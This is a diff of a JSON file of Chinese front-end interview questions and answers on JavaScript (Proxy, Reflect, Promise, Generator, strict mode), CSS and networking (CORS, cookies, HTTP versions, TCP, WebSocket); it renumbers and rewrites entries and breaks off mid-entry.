           "content": "1.作用域 \n\nvar 函数作用域。在函数外部声明时是全局作用域。\n\n`let` / `const`块级作用域 。变量的作用域限制在最近的一对花括号 `{}` 内\n\n2.变量提升\n\nvar 完整提升。声明和初始化同时提升到作用域顶部，但初始化为 `undefined`\n\n`let` / `const` 只提升声明。声明会被提升，但不会被初始化。存在暂时性死区，在变量声明语句执行之前，访问该变量都会抛出 `ReferenceError`\n\n3.绑定与赋值\n\nvar 可以重复声明，在全局作用域声明时，会挂载到 `window` 或 `global` 对象。\n\nlet、const **不允许重复声明**。在同一作用域内重复声明会抛出 `SyntaxError`。也不会挂载到全局对象上。",
           "hasAnswer": true
         },
         {
+          "id": "js-basic-28",
+          "title": "说说Proxy",
+          "content": "`Proxy` 的核心价值在于**对对象的操作进行非侵入式（Non-invasive）的拦截和定制**。它提供了一个代理层，允许我们在对象操作的 13 个内部方法（如 `get`, `set`, `apply`, `construct`）被调用时介入。\n\n应用：\n\n响应式系统和状态管理（最重要，比如vue）；`Proxy` 可以直接监听对象属性的增删改查，而不需要像 `Object.defineProperty` 那样预先遍历所有属性，解决了数组和新增属性的监听难题。\n\n数据校验与属性保护：在 `set` 拦截器中，加入自定义的校验逻辑（如类型检查、范围检查），如果不通过则抛出错误或拒绝赋值，防止不合规的数据流入\n\n实现私有属性：在 `get` 或 `has` 拦截器中，对特定前缀（如 `_` 开头的属性）返回 undefined` 或 `false`，模拟私有属性效果。\n\n写法：\n```javascript\nconst handler = {\n    // 陷阱 (Trap)：拦截属性的读取操作\n    get(target, prop, receiver) {\n        if (prop === 'message3') {\n            return `[${target.message1} ${target.message2}]`;\n        }\n        // 默认行为：返回目标对象的属性值\n        return Reflect.get(target, prop, receiver); \n    },\n    // ... 比如 set(target, prop, value, receiver) { ... }\n}\nconst target = {\n    message1: \"Hello\",\n    message2: \"World\"\n};\nconst proxy = new Proxy(target, handler);\n```",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-29",
+          "title": "Reflect 是什么？怎么用",
+          "content": "`Reflect` 是一个内置对象，它提供了一系列静态方法，这些方法与 `Proxy` 陷阱的方法**同名且参数一致**。它提供了 13 个静态方法，这些方法与 `Proxy` 的 13 个拦截器方法一一对应。\n\n例如：\n\n- 以前获取对象属性：`obj.prop` 或 `Object.getOwnPropertyDescriptor(obj, prop)`\n\n- 现在通过 `Reflect`：`Reflect.get(obj, prop)`\n\n- `'prop' in obj` $\\rightarrow$ `Reflect.has(obj, 'prop')`\n\n- `delete obj.prop` $\\rightarrow$ `Reflect.deleteProperty(obj, 'prop')`\n\n在 `Proxy` 的 `handler` 中，我们经常需要执行目标对象上的默认操作。使用 `Reflect` 可以干净、安全地实现这一点。\n\n`Reflect` 将一些命令式的操作符（如 `delete`）或命令式的方法调用（如 `new`）转换成了函数式的调用，使得代码更易于维护和理解。\n\nReflect 能提供操作失败的明确反馈，返回一个**布尔值**表示成功或失败，代码更简洁。一般的 `Object` 上的方法（例如 `Object.defineProperty`），在执行失败时会抛出异常，这需要用 `try...catch` 捕获。",
+          "hasAnswer": true
+        },
+        {
           "id": "js-basic-30",
-          "title": "Proxy 和 Reflect 的应用场景",
-          "content": "1.Proxy ： 对象操作拦截\n\n`Proxy` 的核心价值在于**对对象的操作进行非侵入式（Non-invasive）的拦截和定制**。它提供了一个代理层，允许我们在对象操作的 13 个内部方法（如 `get`, `set`, `apply`, `construct`）被调用时介入。\n\n应用：\n\n响应式系统和状态管理（最重要，比如vue）；`Proxy` 可以直接监听对象属性的增删改查，而不需要像 `Object.defineProperty` 那样预先遍历所有属性，解决了数组和新增属性的监听难题。\n\n数据校验与属性保护：在 `set` 拦截器中，加入自定义的校验逻辑（如类型检查、范围检查），如果不通过则抛出错误或拒绝赋值，防止不合规的数据流入\n\n实现私有属性：在 `get` 或 `has` 拦截器中，对特定前缀（如 `_` 开头的属性）返回 undefined` 或 `false`，模拟私有属性效果。\n\n<mark>2.`Reflect` </mark>\n\n不是一个函数，而是一个静态对象，它提供了 13 个静态方法，这些方法与 `Proxy` 的 13 个拦截器方法一一对应。",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-31",
-          "title": "事件循环",
-          "content": "初始同步脚本执行完毕，**执行上下文栈（ECS）清空时**，事件循环机制才真正开始接管，并进入检查队列的循环。\n\n所有的异步事件一定是当前浏览器执行完同步任务空闲了才做的",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-32",
-          "title": "promise",
+          "title": "说说promise怎么用和优缺点",
           "content": "优点：\n\n解决回调地狱，改为链式回调，提高了代码的可读性和维护性\n\n统一的错误处理机制，集中捕获，简化流程\n\n规范异步状态管理，明确的三种状态：Pending/Fulfilled/Rejected, 使异步操作的结果可预测和可追踪。\n\n易于组合和并行处理，.all .race 等\n\n缺点：\n\n仍然是链式结构（未完全同步化）需要显式的 `.then()` 链来组织代码流程\n\n立即执行的特性，缺乏中断和取消机制\n\n一次性结果，一旦状态确定，就无法再次改变\n\n错误静默，没有catch的话，不会在运行时立即抛出执行时才捕获\n\n错误静默，没有catch的话，不会在运行时立即抛出执行时才捕获",
           "hasAnswer": true
         },
         {
+          "id": "js-basic-31",
+          "title": "js有哪些异步方法",
+          "content": "1. 计时器 settimeout setInterval，属于宏任务\n2. 异步流程控制与状态管理：Promise async/await，属于微任务\n3. 网络请求与文件操作：\n- **`fetch(url)` (现代标准):** 微任务\n  - 返回一个 Promise 对象，用于发起网络请求。\n  - 是最常用的网络请求 API，取代了大部分 XHR 用法。\n- **`XMLHttpRequest` (XHR) (传统方法):** 特指基于事件监听而不是promise的，是宏任务\n  - 传统的回调式 API，现在主要用于文件上传等特定场景，或需要浏览器底层控制的场合。\n- **`FileReader` / 各种 I/O 操作:** 也是通过回调或 Promise返回，宏任务",
+          "hasAnswer": true
+        },
+        {
+          "id": "js-basic-32",
+          "title": "Generator是什么怎么用",
+          "content": "Generator 函数（生成器）是一种特殊的函数，它能够**暂停执行**并在稍后**从暂停点恢复执行**。这是通过 Generator 函数内部维护的一个 **状态机 (State Machine)** 来实现的。本质是同步的\n\n`function`定义 Generator 函数\n\n`yield`暂停函数执行，并返回 `yield` 后的值\n\n`.next()`恢复函数执行，并返回一个包含 `{value, done}` 的对象。\n\n意义：简化异步编程；提供函数**暂停和恢复执行**的底层能力 (`yield` 机制)，这是实现“等待”的唯一方式；返回一个同时满足可迭代和迭代器协议的对象\n\nGenerator 解决了 **代码流的连续性** 问题，这是 Promise （依赖于 回调函数）无法做到的。\n\n`async/await` 的底层基础是 Promise，但它的核心机制是 Generator",
+          "hasAnswer": true
+        },
+        {
           "id": "js-basic-33",
-          "title": "异步",
-          "content": "计时器 settimeout setInterval，宏任务\n\n网络请求与文件操作：\n\n- **`fetch(url)` (现代标准):** 微任务\n  \n  - 返回一个 Promise 对象，用于发起网络请求。\n  \n  - 是最常用的网络请求 API，取代了大部分 XHR 用法。\n\n- **`XMLHttpRequest` (XHR) (传统方法):** 特指基于事件监听而不是promise的，是宏任务\n  \n  - 传统的回调式 API，现在主要用于文件上传等特定场景，或需要浏览器底层控制的场合。\n\n- **`FileReader` / 各种 I/O 操作:** 也是通过回调或 Promise返回，宏任务\n\n异步流程控制与状态管理：Promise async/await，微任务",
+          "title": "Generator和 Async/Await 原理",
+          "content": "核心机制：状态机\n\n普通函数从头到尾执行一次，没有状态。而 Generator 函数被编译后，其函数体内的每一行代码（特别是 `yield` 语句）都成为了状态机中的一个节点。\n\n`yield` 关键字：暂停的指令（将 Generator 函数的执行上下文完整地保存，并挂起，引擎立即将控制权返回给调用者所在的执行上下文，即调用 `gen.next()` 的那个上下文）\n\n`.next()` 方法：恢复的指令（执行优先级非常高，因为它是一个**同步操作**，讲挂起的上下文放入当前执行栈，会影响后续其他的宏任务微任务，就像一个同步函数调用）\n\nGenerator 对象的生命周期内，其内部状态（包括局部变量）被持续存储在内存中，这就是它能够从上次离开的地方继续执行的原因。\n\n```js\nfunction* numberGenerator() {\n  console.log('--- 启动 ---');\n  let result1 = yield 1;\n\n  console.log('--- 恢复，接收到:', result1, '---');\n  let result2 = yield 2; \n\n  console.log('--- 恢复，接收到:', result2, '---');\n  return 3;\n}\n\n// 1. 调用 Generator 函数，返回迭代器对象（Generator Object）\nconst gen = numberGenerator(); \n\nconsole.log(gen.next()); \n// 输出: --- 启动 ---\n// 输出: { value: 1, done: false } (遇到第一个 yield 暂停)\n\nconsole.log(gen.next('A')); // 将 'A' 作为上一个 yield 的返回值注入\n// 输出: --- 恢复，接收到: A ---\n// 输出: { value: 2, done: false } (遇到第二个 yield 暂停)\n\nconsole.log(gen.next('B')); // 将 'B' 作为上一个 yield 的返回值注入\n// 输出: --- 恢复，接收到: B ---\n// 输出: { value: 3, done: true } (遇到 return 结束)\n\nconsole.log(gen.next());\n// 输出: { value: undefined, done: true } (已完成)\n```\n\n`async/await` 是 ES7 (ES2016) 引入的，它的底层是基于 **Promise** 和 **Generator** 实现的**语法糖 (Syntactic Sugar)**。它的核心原理是**自动化**了 Generator 的驱动过程，相当于异步完成后自动调用了.next\n\n对比：\n- **Promise** 是 `async/await` 的**外部接口**（输入和输出）。\n- **Generator** 是 `async/await` 实现**暂停和恢复**的**内部引擎**。\n- **async/await**` 是对 **Promise** 和 **Generator** 的一种**语法糖 (Syntactic Sugar)**。",
           "hasAnswer": true
         },
         {
           "id": "js-basic-34",
-          "title": "Generator是什么怎么用",
-          "content": "Generator 函数（生成器）是一种特殊的函数，它能够**暂停执行**并在稍后**从暂停点恢复执行**。这是通过 Generator 函数内部维护的一个 **状态机 (State Machine)** 来实现的。\n\n`function*`定义 Generator 函数\n\n`yield`暂停函数执行，并返回 `yield` 后的值\n\n`.next()`恢复函数执行，并返回一个包含 `{value, done}` 的对象。\n\n意义：简化异步编程；提供函数**暂停和恢复执行**的底层能力 (`yield` 机制)，这是实现“等待”的唯一方式；返回一个同时满足可迭代和迭代器协议的对象\n\nGenerator 解决了 **代码流的连续性** 问题，这是 Promise （依赖于 回调函数）无法做到的。\n\n`async/await` 的底层基础是 Promise，但它的核心机制是 Generator",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-35",
-          "title": "Generator和 Async/Await 原理",
-          "content": "核心机制：状态机\n\n普通函数从头到尾执行一次，没有状态。而 Generator 函数被编译后，其函数体内的每一行代码（特别是 `yield` 语句）都成为了状态机中的一个节点。\n\n`yield` 关键字：暂停的指令（将 Generator 函数的执行上下文完整地保存，并挂起，引擎立即将控制权返回给调用者所在的执行上下文，即调用 `gen.next()` 的那个上下文）\n\n`.next()` 方法：恢复的指令（执行优先级非常高，因为它是一个**同步操作**，讲挂起的上下文放入当前执行栈，会影响后续其他的宏任务微任务，就像一个同步函数调用）\n\nGenerator 对象的生命周期内，其内部状态（包括局部变量）被持续存储在内存中，这就是它能够从上次离开的地方继续执行的原因。\n\n```js\nfunction* numberGenerator() {\n  console.log('--- 启动 ---');\n  let result1 = yield 1;\n\n  console.log('--- 恢复，接收到:', result1, '---');\n  let result2 = yield 2; \n\n  console.log('--- 恢复，接收到:', result2, '---');\n  return 3;\n}\n\n// 1. 调用 Generator 函数，返回迭代器对象（Generator Object）\nconst gen = numberGenerator(); \n\nconsole.log(gen.next()); \n// 输出: --- 启动 ---\n// 输出: { value: 1, done: false } (遇到第一个 yield 暂停)\n\nconsole.log(gen.next('A')); // 将 'A' 作为上一个 yield 的返回值注入\n// 输出: --- 恢复，接收到: A ---\n// 输出: { value: 2, done: false } (遇到第二个 yield 暂停)\n\nconsole.log(gen.next('B')); // 将 'B' 作为上一个 yield 的返回值注入\n// 输出: --- 恢复，接收到: B ---\n// 输出: { value: 3, done: true } (遇到 return 结束)\n\nconsole.log(gen.next());\n// 输出: { value: undefined, done: true } (已完成)\n```\n\n`async/await` 是 ES7 (ES2016) 引入的，它的底层是基于 **Promise** 和 **Generator** 实现的**语法糖 (Syntactic Sugar)**。它的核心原理是**自动化**了 Generator 的驱动过程，相当于异步完成后自动调用了.next\n\n开放题：",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-36",
-          "title": "你觉得js里this的设计怎么样?有没有什么缺点啥的",
-          "content": "`this` 的设计初衷是为了实现高度的**灵活性**和**代码复用**。通过显式绑定隐式绑定可以更加灵活\n\n`this` 的所有缺点都源于一个核心问题：**它的值是动态绑定（Runtime Dynamic Binding）的，依赖于函数的调用点 (Call Site)，而不是定义点。**\n\n有严重的上下文丢失陷阱：回调函数问题： 当一个对象的方法被作为参数传递给异步函数（如 `setTimeout`、`Promise.then()`）或事件处理器时，它通常会失去其隐式绑定，退化为**默认绑定（指向全局对象或 `undefined`）**。\n\n违反词法作用域原则 ：JavaScript 的变量（使用 `let/const`）是词法作用域（静态确定）的，但 `this` 却是动态作用域的。这种不一致性打破了语言的统一性，使得在阅读嵌套代码时很难预测 `this` 的值。\n\nes6通过箭头函数和class弥补了这个问题，开发者应当尽可能利用箭头函数和 `class` 语法来避免直接依赖普通函数的动态 `this` 机制",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-37",
-          "title": "proxy写法",
-          "content": "```javascript\nconst handler = {\n    // 陷阱 (Trap)：拦截属性的读取操作\n    get(target, prop, receiver) {\n        if (prop === 'message3') {\n            return `[${target.message1} ${target.message2}]`;\n        }\n        // 默认行为：返回目标对象的属性值\n        return Reflect.get(target, prop, receiver); \n    },\n    // ... 比如 set(target, prop, value, receiver) { ... }\n}\nconst target = {\n    message1: \"Hello\",\n    message2: \"World\"\n};\nconst proxy = new Proxy(target, handler);\n```",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-38",
-          "title": "Reflect 是什么？怎么用",
-          "content": "`Reflect` 是一个内置对象，它提供了一系列静态方法，这些方法与 `Proxy` 陷阱的方法**同名且参数一致**。\n\n例如：\n\n- 以前获取对象属性：`obj.prop` 或 `Object.getOwnPropertyDescriptor(obj, prop)`\n\n- 现在通过 `Reflect`：`Reflect.get(obj, prop)`\n\n- `'prop' in obj` $\\rightarrow$ `Reflect.has(obj, 'prop')`\n\n- `delete obj.prop` $\\rightarrow$ `Reflect.deleteProperty(obj, 'prop')`\n\n在 `Proxy` 的 `handler` 中，我们经常需要执行目标对象上的默认操作。使用 `Reflect` 可以干净、安全地实现这一点。\n\n`Reflect` 将一些命令式的操作符（如 `delete`）或命令式的方法调用（如 `new`）转换成了函数式的调用，使得代码更易于维护和理解。\n\nReflect 能提供操作失败的明确反馈，返回一个**布尔值**表示成功或失败，代码更简洁。一般的 `Object` 上的方法（例如 `Object.defineProperty`），在执行失败时会抛出异常，这需要用 `try...catch` 捕获。",
-          "hasAnswer": true
-        },
-        {
-          "id": "js-basic-39",
-          "title": "Object.defineProperties 的作用",
-          "content": "把参数2的属性赋值给参数1，特点是不仅复制属性，还复制属性的属性，比如是否可枚举、可修改这些属性\n\n- 不仅仅是赋值，而是**使用属性描述符定义属性**\n\n- 可以控制属性的可写性、可枚举性、可配置性\n\n- 可以定义访问器属性（getter/setter）\n\n- 默认属性特性与普通赋值不同",
+          "title": "严格模式",
+          "content": "严格模式是 ES5 引入的一种特殊模式，旨在选择性地限制 JavaScript 的某些不安全、低效或有缺陷的行为\n\n- **全局模式：** 在脚本文件顶部添加 `\"use strict\";`。\n\n- **函数模式：** 在函数体内部顶部添加 `\"use strict\";`\n\n严格模式是保证代码质量和项目维护性的要求\n\n重要规则：\n\n禁止隐式全局变量：尝试给未声明的变量赋值时，将不再自动在全局对象 (`window` 或 `global`) 上创建该变量，而是**直接抛出 `ReferenceError`**。\n\n规范 `this` 默认绑定（上下文可预测性）：独立函数调用 `this` 为 `undefined`\n\n静默失败转为抛出错误 (代码健壮性)\n\n禁用堆栈调用属性，禁止函数动态获取调用栈信息，（严重阻碍了js 引擎进行即时编译优化",
           "hasAnswer": true
         }
       ]
@@ -498,19 +468,19 @@
         },
         {
           "id": "css-html-14",
-          "title": ".\"请描述一个你如何使用SVG来增强网站视觉体验的情况。\"",
+          "title": "请描述一个你如何使用SVG来增强网站视觉体验的情况。",
           "content": "",
           "hasAnswer": false
         },
         {
           "id": "css-html-15",
-          "title": "\"解释CSS中的BEM命名方法，并展示如何使用它来组织你的样式表。",
+          "title": "解释CSS中的BEM命名方法，并展示如何使用它来组织你的样式表。",
           "content": "**BEM** 是 **Block (块)、Element (元素)、Modifier (修饰符)** 的缩写，是一种用于组织 CSS 类名的命名规范。它旨在解决 CSS 全局作用域带来的命名冲突和样式依赖问题，使样式代码更具可读性和可维护性。示例：.card__title--large   .card__image--dark\n\n```css\n.user-card {\n    display: flex;\n    padding: 20px;\n    border: 1px solid #ccc;\n\n    /* 2. Modifier: .user-card--vip (变体) */\n    &--vip {\n        border-color: gold;\n        box-shadow: 0 0 5px gold;\n    }\n...\n}\n```",
           "hasAnswer": true
         },
         {
           "id": "css-html-16",
-          "title": "\"你将如何处理跨浏览器的兼容性问题，尤其是在不同设备和操作系统上?\"",
+          "title": "你将如何处理跨浏览器的兼容性问题，尤其是在不同设备和操作系统上?",
           "content": "- **制定统一的兼容性基线：**\n  \n  - 首先确定项目需要支持的**最低浏览器版本和设备范围**（如 IE11+、最近 2 个版本的 Chrome/Firefox/Safari/Edge、iOS 14+、Android 10+）。\n  \n  - **渐进增强 (Progressive Enhancement):** 优先保证核心功能在所有浏览器中可用，然后为现代浏览器添加高级功能和更优的体验。\n  \n  - **优雅降级 (Graceful Degradation):** 先为现代浏览器构建，然后确保在老旧浏览器中也能以合理的方式工作。\n\n- **编码规范与工具：**\n  \n  - **CSS 前缀：** 使用 **Autoprefixer** 等工具，自动为 CSS3 属性（如 `transform`、`flex`、`grid`）添加必要的浏览器厂商前缀（如 `-webkit-`, `-moz-`）。\n  \n  - **CSS Reset/Normalize：** 使用 **Normalize.css** 或 **Reset.css** 来统一不同浏览器对标签默认样式的差异。\n  \n  - **Polyfills 和 Transpilers：**\n    \n    - 使用 **Babel** 将 ES6+ 的 JavaScript 语法编译为 ES5，以兼容老旧浏览器。\n    \n    - 使用 **Polyfills**（如 `core-js`）为老旧浏览器提供缺失的现代 API（如 `Promise`、`fetch`）。\n\n- **兼容性处理技巧：**\n  \n  - **Flexbox/Grid 兼容性：** 明确知道哪些属性在旧版本浏览器上不支持，并提供备用方案（例如对不支持 Flexbox 的浏览器使用 `float` 布局）。\n  \n  - **特性检测：** 相比于用户代理 (UA) 检测，优先使用 **特性检测 (Feature Detection)**，如 Modernizr，来判断浏览器是否支持某一 CSS 或 JS 特性，并据此执行不同的代码分支。\n\n- **测试与验证：**\n  \n  - 在真实的设备、操作系统和浏览器组合上进行测试。\n  \n  - 使用 **BrowserStack**、**Sauce Labs** 等云测试平台进行自动化和手动兼容性测试。\n  \n  - 利用 Chrome DevTools 的**设备模拟器**和**网络限速**功能进行快速调试",
           "hasAnswer": true
         },
@@ -1129,61 +1099,91 @@
         {
           "id": "network-2",
           "title": "七层网络模型",
-          "content": "**物 数 网 传 会 表 应**\n\n| **应用层 (Application)**  | 提供用户接口，实现特定网络服务。       |\n| ---------------------- | ---------------------- |\n| **表示层 (Presentation)** | 数据格式转换、加密解密、压缩解压缩。     |\n| **会话层 (Session)**      | 建立、管理和终止会话（如同步通信）。     |\n| **传输层 (Transport)**    | **(同五层)** 进程间通信，可靠性保障。 |\n| **网络层 (Network)**      | **(同五层)** 路由寻址，数据包转发。  |\n| **数据链路层 (Data Link)**  | **(同五层)** 帧的传输，MAC 寻址。 |\n| **物理层 (Physical)**     | **(同五层)** 比特流传输。       |",
+          "content": "口诀：**物 数 网 传 会 表 应**\n\n| **应用层 (Application)**  | 提供用户接口，实现特定网络服务。       |\n| ---------------------- | ---------------------- |\n| **表示层 (Presentation)** | 数据格式转换、加密解密、压缩解压缩。     |\n| **会话层 (Session)**      | 建立、管理和终止会话（如同步通信）。     |\n| **传输层 (Transport)**    | **(同五层)** 进程间通信，可靠性保障。 |\n| **网络层 (Network)**      | **(同五层)** 路由寻址，数据包转发。  |\n| **数据链路层 (Data Link)**  | **(同五层)** 帧的传输，MAC 寻址。 |\n| **物理层 (Physical)**     | **(同五层)** 比特流传输。       |",
           "hasAnswer": true
         },
         {
           "id": "network-3",
-          "title": "cookie",
-          "content": "**Cookie** 是一种在客户端（浏览器）存储少量数据的机制。它主要用于在无状态的 HTTP 协议中实现**状态管理**。\n\n- **工作机制：**\n  \n  1. 服务器在 HTTP 响应头中通过 `Set-Cookie` 字段将数据发送给浏览器。\n  \n  2. 浏览器将这些数据以键值对的形式存储起来。\n  \n  3. 之后浏览器向同一域名发送请求时，会在请求头中自动带上 `Cookie` 字段发送给服务器。\n\n- **主要用途：**\n  \n  - **会话管理：** 存储用户登录状态、购物车内容等。\n  \n  - **个性化：** 存储用户偏好设置、主题等。\n  \n  - **追踪：** 记录用户行为，用于分析和广告。\n\n- **重要安全属性：**\n  \n  - `HttpOnly`: 阻止 JavaScript 通过 `document.cookie` 访问 Cookie，防止 XSS 攻击。\n  \n  - `Secure`: 仅在 HTTPS 连接中发送 Cookie。\n  \n  - `SameSite`: 用于防止 CSRF 攻击，限制 Cookie 跨站发送。",
+          "title": "什么是跨域 (CORS)",
+          "content": "**CORS (Cross-Origin Resource Sharing)**，即“跨源资源共享”。\n\n- **本质：** 它是一套 **HTTP Header 机制**，由浏览器和服务器共同协作，决定是否允许跨域请求。\n\n- **起因：** 浏览器为了安全，实行了**同源策略 (SOP)**。默认情况下，如果 A 域名的脚本请求 B 域名的接口，浏览器会拦截返回的结果。\n\n- **解决：** CORS 允许服务器在响应头里加一句 `Access-Control-Allow-Origin: A域名`。浏览器看到这个“通行证”，才会把数据放行给前端 JS。\n\n在实战中，我们可以通过设置 `Access-Control-Max-Age`（这个字段用来指定预检请求的结果能够被缓存多长时间。） 来缓存预检结果，减少请求次数，优化性能。\n\n追问：当你设置了 `Access-Control-Allow-Credentials: true` 时，后端的 `Access-Control-Allow-Origin` 能设置为星号 `*`吗？\n\n不能。后果： 浏览器会直接报错，请求失败。正确做法： 服务器必须指定确定的、唯一的域名。例如：`Access-Control-Allow-Origin: https://www.your-app.com`。\n**为什么有这个限制？** 这是为了**防止 CSRF 攻击**。如果允许任何网站都能带 Cookie 跨域访问你的接口，那安全防线就彻底崩塌了。浏览器强制要求你必须指明具体的“信任域名”",
           "hasAnswer": true
         },
         {
           "id": "network-4",
-          "title": "http1.0 1.1 2.0 https",
-          "content": "**HTTPS 补充：** HTTPS 是在 HTTP 层和 TCP 层之间插入 **TLS/SSL (安全传输层协议)** 的产物。\n\n- **核心作用：** 提供**数据加密、身份认证和数据完整性**。\n\n- **加密方式：** 采用**混合加密**机制，利用**非对称加密**（证书）进行身份认证和密钥交换，利用**对称加密**对后续数据进行高效加密传输。\n\n1.0：**非持久连接**，每次请求/响应后关闭 TCP 连接；频繁建立/关闭 TCP 连接\n\n1.1：**持久连接**，TCP 连接默认保持打开，可复用。支持 `PUT`, `DELETE` 等更多方法；支持 `Content-Range`、`Cache-Control` 等header，cookie增加了属性；仍有 **队头阻塞**\n\n2.0：**多路复用**，单个 TCP 连接上同时处理多个请求和响应，消除了队头阻塞；**支持头部压缩**，减少头部大小；**支持服务端推送**；但基于TCP的队头阻塞仍存在，HTTP/2 在网络质量差、丢包率高的情况下，性能可能比 HTTP/1.1 更差，因为 HTTP/1.1 至少可以通过多个连接（尽管数量有限）来分散风险\n\nHTTP/3 放弃了 TCP，转而使用 **QUIC 协议**，而 QUIC 是基于 **UDP** 实现的\n\n大多数现代浏览器（Chrome, Firefox, Edge）对**同一个域名 (Host)** 的最大并发 TCP 连接数限制在 **6 到 8 个**之间，针对1.1这个问题很明显",
+          "title": "为什么有时跨域会发两次请求（预检请求 OPTIONS）？到底在检什么？",
+          "content": "浏览器将跨域请求分为两类：**简单请求** 和 **非简单请求**。\n ① 简单请求（直接发），如果请求满足以下所有条件：\n- 方法是：`GET`、`POST`、`HEAD`。\n- Header 只有最基本的：`Accept`、`Content-Type`（仅限 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`）等。\n\n② 非简单请求（不满足简单请求）浏览器就会触发 **OPTIONS 预检请求**：\n\n**OPTIONS 的目的**是询问服务器：当前请求源是否被允许？所使用的 HTTP 方法和 Header 是否合法？只有预检通过，浏览器才会发送真实的业务请求。这样做的核心是为了**保护服务器免受非预期跨域请求的影响**（特别是那些具有写操作的请求）。",
           "hasAnswer": true
         },
         {
           "id": "network-5",
+          "title": "Cookie 如何实现http状态管理",
+          "content": "**Cookie** 是一种在客户端（浏览器）存储少量数据的机制。它主要用于在无状态的 HTTP 协议中实现**状态管理**。\n\n- **工作机制：**\n  \n  1. 服务器在 HTTP 响应头中通过 `Set-Cookie` 字段将数据发送给浏览器。\n  \n  2. 浏览器将这些数据以键值对的形式存储起来。\n  \n  3. 之后浏览器向同一域名发送请求时，会在请求头中自动带上 `Cookie` 字段发送给服务器。\n\n- **主要用途：**\n  \n  - **会话管理：** 存储用户登录状态、购物车内容等。\n  \n  - **个性化：** 存储用户偏好设置、主题等。\n  \n  - **追踪：** 记录用户行为，用于分析和广告。\n\n- **重要安全属性：**\n  \n  - `HttpOnly`: 阻止 JavaScript 通过 `document.cookie` 访问 Cookie，防止 XSS 攻击。\n  \n  - `Secure`: 仅在 HTTPS 连接中发送 Cookie。\n  \n  - `SameSite`: 用于防止 CSRF 攻击，限制 Cookie 跨站发送。\n\n  - Domain: 设置cookie生效的域名",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-6",
+          "title": "对比 http1.0 1.1 2.0 https",
+          "content": "**HTTPS 补充：** HTTPS 是在 HTTP 层和 TCP 层之间插入 **TLS/SSL (安全传输层协议)** 的产物。\n\n- **核心作用：** 提供**数据加密、身份认证和数据完整性**。\n\n- **加密方式：** 采用**混合加密**机制，利用**非对称加密**（证书）进行身份认证和密钥交换，利用**对称加密**对后续数据进行高效加密传输。\n\n1.0：**非持久连接**，每次请求/响应后关闭 TCP 连接；频繁建立/关闭 TCP 连接\n\n1.1：**持久连接**，TCP 连接默认保持打开，可复用。支持 `PUT`, `DELETE` 等更多方法；支持 `Content-Range`、`Cache-Control` 等header，cookie增加了属性；仍有 **队头阻塞**\n\n2.0：**多路复用**，单个 TCP 连接上同时处理多个请求和响应，消除了队头阻塞；**支持头部压缩**，减少头部大小；**支持服务端推送**；但基于TCP的队头阻塞仍存在，HTTP/2 在网络质量差、丢包率高的情况下，性能可能比 HTTP/1.1 更差，因为 HTTP/1.1 至少可以通过多个连接（尽管数量有限）来分散风险\n\nHTTP/3 放弃了 TCP，转而使用 **QUIC 协议**，而 QUIC 是基于 **UDP** 实现的\n\n大多数现代浏览器（Chrome, Firefox, Edge）对**同一个域名 (Host)** 的最大并发 TCP 连接数限制在 **6 到 8 个**之间，针对1.1这个问题很明显",
+          "hasAnswer": true
+        },
+        {
+          "id": "network-7",
           "title": "TCP协议",
           "content": "TCP 是传输层最重要的协议之一，它提供**面向连接的、可靠的、基于字节流**的通信服务。\n\n- **面向连接：** 数据传输前需要经过**三次握手**建立连接，传输结束后需要经过**四次挥手**释放连接。\n\n- **可靠性：**\n  \n  - **序号 (Sequence Number) 与确认号 (Acknowledgment Number)：** 保证数据包按序到达，并对收到的数据进行确认。\n  \n  - **重传机制：** 发送方在收到确认前，会重传数据。\n  \n  - **校验和：** 检查数据在传输过程中是否被损坏。\n\n- **流量控制：** 利用**滑动窗口**机制，控制发送方的发送速率，防止接收方来不及处理数据而丢包。\n\n- **拥塞控制：** 通过慢启动、拥塞避免、快重传、快恢复等机制，防止网络整体性能下降。",
           "hasAnswer": true
         },
         {
-          "id": "network-6",
+          "id": "network-8",
           "title": "websocket：数据传输方式？状态码？怎么实现重连",
           "content": "WebSocket 协议建立在 HTTP 协议之上（通过 HTTP 握手）\n\n特点\n\n- **双向全双工通信：** 客户端和服务器可以在任何时间独立地向对方发送数据，无需等待对方的响应。\n\n- **基于帧 (Frame) 的数据传输：** 数据以更小、开销更低的**帧**为单位进行传输，而不是像 HTTP 那样需要完整的请求和响应头，大大降低了数据传输的开销和延迟。\n\n- **保持持久连接：** 连接一旦建立，就会一直保持打开状态，直到任意一方关闭或出现异常。\n\n- **独立的应用层协议**（虽然基于HTTP升级），有自己的安全机制，不是依赖浏览器的同源策略。**服务器在握手阶段通过验证 Origin 来控制访问**\n\n状态码：**成功的握手状态码：** `101 Switching Protocols`。\n\n- 客户端发送带有 `Upgrade: websocket` 和 `Connection: Upgrade` 头的 HTTP 请求。\n\n- 服务器如果支持，则返回 `101` 状态码，表示协议切换成功，连接正式升级为 WebSocket。\n\n怎么实现重连：由于网络抖动、服务器重启等原因，WebSocket 连接可能中断。\n\n1. **监听连接关闭事件：** 客户端通过监听 `WebSocket` 对象的 `onclose` 事件来检测连接中断。\n\n2. **设置重连计时器：** 在 `onclose` 事件中，启动一个定时器。\n\n3. **退避算法 (Backoff)：** 为了避免因网络持续中断导致客户端不断发起重连请求（**重连风暴**），应使用**指数退避**策略。\n   \n   - 第一次等待 1 秒，第二次等待 2 秒，第三次等待 4 秒，依此类推，直到达到最大重连次数或最大等待时间。\n\n4. **重新发起连接：** 定时器触发后，重新创建 `WebSocket` 实例并发起连接。",
           "hasAnswer": true
         },
         {
-          "id": "network-7",
+          "id": "network-9",
           "title": "http缓存",
-          "content": "",
-          "hasAnswer": false
-        },
-        {
-          "id": "network-8",
-          "title": "状态码",
-          "content": "`304 Not Modified` (协商缓存命中)",
